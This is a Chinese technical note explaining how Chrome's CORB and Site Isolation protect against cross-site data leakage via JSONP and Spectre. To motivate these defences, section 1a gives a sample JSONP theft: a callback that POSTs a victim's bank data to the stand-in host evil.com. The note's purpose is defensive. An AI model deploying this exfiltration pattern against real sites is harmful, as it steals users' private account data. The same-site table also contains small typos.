---
tags:
  - "#public"
---
# 1. 背景
Chrome浏览器加载网络资源时，将网络资源分为两类：
- 数据资源：HTML、XML、JSON
- 媒体资源：Images、JS、CSS、Font

`数据资源`的加载，受到CORS策略的限制，用户不会得到相关的响应
`媒体资源`的加载，不受到CORS策略，这意味着资源的来源是不受控的，相当于互联网上任意的资源都可以被加载，而这可能会带来某些安全问题👇🏻

### 媒体资源加载的安全问题
用户页面请求了一个JS资源，视JS资源返回的内容，分情况进行讨论：
##### a. 返回JS代码
这是JS的正常使用情况，但是也可以被用来实现恶意攻击。
例如，这个JS资源，其实是向官方银行的api，发起一个网络请求：
```HTML
<script src="https://bank.com/api/user?callback=steal"></script>
```
 
> 因为是在用户的页面上发起的，所以请求会携带用户的登录信息Cookie。

而这个接口请求的响应，恰好是JSONP，即带参数（即用户信息）的函数调用：
```JavaScript
steal({"balance": 100000})
```

并且攻击者已经在window对象上设置了回调函数：
```JavaScript
function steal(data) {
    // 拿到了！发送到攻击者服务器
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
```
攻击者可以将拿到的用户数据，直接上传到自己的服务器中，这就造成了用户信息的泄露。

这就是为什么JSONP被淘汰了，服务器的接口不应该支持JSONP结构的响应的，这一定存在着安全漏洞。

##### b. 返回API响应
如果接口请求不支持JSONP格式，只返回JSON数据，是否还会有安全隐患呢？

例如，下面这个JS资源，其实攻击者的脚本，向官方银行的api，发起了一个网络请求：
```HTML
<script src="https://bank.com/api/user"></script>
```
这个网络请求的结果，是一个JSON数据。

在没有Site Isolation时，这些数据会被写入到当前页面Render Process的内存中；而借助[Spectre](https://spectreattack.com/spectre.pdf)，攻击者通过侧信道攻击，可以推测出内存中数据的内容，同样会造成用户信息的泄露

# 2. CORB
[**Cross-Origin Read Blocking (CORB)**](https://www.chromium.org/Home/chromium-security/corb-for-developers/) [^1]是一种防御[[Chrome 跨站数据保护机制解析：CORB 与 Site Isolation#b. 返回API响应|b.返回API响应]]问题的方法，浏览器会对资源请求的响应内容进行嗅探（sniff），如果响应的格式和预期资源格式不匹配，则会将响应内容设置为空。
例如：一个script资源请求，预期返回JavaScript代码，但实际返回的内容是JSON数据，则会由CORB策略，将响应内容设置为空。

### 2.1 如何判断资源类型
**可解析类的资源（HTML/XML/JSON）**
需在response header中：
- 准确设置`Content-Type`的值
- 设置`X-Content-Type-Options: nosniff` ：如果不设置nosniff，浏览器默认会进行嗅探，如果嗅探内容结构与Content-Type不符合，则会被CORB置为空

Content-Type可选值：

| 资源类型 |                     Content-Type                     |
| :--: | :--------------------------------------------------: |
| HTML |                      text/html                       |
| XML  |  text/html, application/xml, 或任意子类型以`+xml`结尾的MIME类型  |
| JSON | text/json, application/json, 或任意子类型以`+json`结尾的MIME类型 |

**下载类的资源（PDF/ZIP/PNG）**
请求此类资源，服务器应该强制要求携带CSRF Token。而Token应该由可解析类资源（HTML/XML/JSON）携带

# 3. Site Isolation
Site Isolation[^2] 实现了不同站点的页面、iframe，使用不同的Render Process，他是对CORB策略的兜底。
不同站点使用不同的Render Process，可以进一步避免恶意脚本，将数据写入到目标进程中，这样恶意脚本就无法推测出目标进程所携带的用户信息。

**判断不同站点**
Site Isolation判断条件如下：
- eTLD+1，即有效顶级域加一级的域名，是否一致。例如：`baidu.com`就是eTLD+1，其中eTLD是`com`
- 协议是否一致
> 跨域的判断不同，跨域是判断协议、域名、端口三者均一致

|         网页域名         |        内嵌域名         | 是否同Site |       解释       |
| :------------------: | :-----------------: | :-----: | :------------: |
|    a.example.com     |      b.example      |    是    |    eTLD+1相同    |
|     example.com      |      evil.com       |    否    |    eTLD+1不同    |
|     a.github.io      |    b.githutb.io     |    否    | github.io是公共后缀 |
| http://a.example.com | https://example.com |    否    |      协议不同      |

# 参考资料
[^1]: [Cross-Origin Read Blocking for Web Developers](https://www.chromium.org/Home/chromium-security/corb-for-developers/#for-other-resource-types-eg-pdf-zip-png)
[^2]: [Site Isolation for web developers](https://developer.chrome.com/blog/site-isolation/#unload_handlers_might_time_out_more_often)